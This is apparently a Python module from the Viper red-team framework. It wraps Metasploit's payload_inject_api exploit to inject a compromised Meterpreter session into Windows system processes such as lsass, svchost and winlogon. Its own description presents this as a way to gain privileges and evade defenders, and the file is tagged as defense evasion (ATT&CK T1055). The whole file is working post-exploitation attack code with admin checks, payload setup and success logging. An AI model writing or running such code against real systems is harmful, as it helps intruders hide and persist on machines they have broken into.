# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "注入到Windows系统进程"
    DESC_ZH = "尝试将Session所在的进程注入到系统原生的进程中.\n" \
              "模块会尝试注入到services,wininit,svchost,lsm,lsass,winlogon等进程.\n" \
              "注入系统进程是提权或绕过防守人员排查的很好的手段.\n" \
              "模块需要管理员权限,退出Session时可能会引发系统异常,请不要手工退出Session.\n"
    WARN_ZH = "成功注入系统进程后请勿关闭Session"

    NAME_EN = "Inject into Windows system process"
    DESC_EN = "Try to inject the process where the Session is located into the native process of the system.\n" \
              "The module will try to inject into services, wininit, svchost, lsm, lsass, winlogon and other processes.\n" \
              "Injecting system processes is a good way to raise authority or bypass the investigation of defenders.\n" \
              "The module requires administrator permissions, and system exceptions may be caused when exiting the Session. Please do not exit the Session manually.\n"
    WARN_EN = "Do not close the Session after successfully injecting into the system process"

    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/ud0pd6"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/payload_inject_api"
        self.opts['SYSTEMTARGETS'] = True

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        if not session.is_admin:
            return False, "模块要求最低权限为管理员权限,如需低权限进程迁移,请选择<Session克隆>模块", "The module requires the minimum permissions to be administrator permissions, if you need low-privileged process migration, please select the <Session clone> module"

        flag = self.set_payload_by_handler()
        if not flag:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
        else:
            self.log_good("进程迁移成功", "Process migration succeeded")
            self.log_good(f"新进程PID: {data.get('pid')}",
                          f"New process PID: {data.get('pid')}")
            self.log_good(f"新进程名: {data.get('pname')}",
                          f"New process name: {data.get('pname')}")
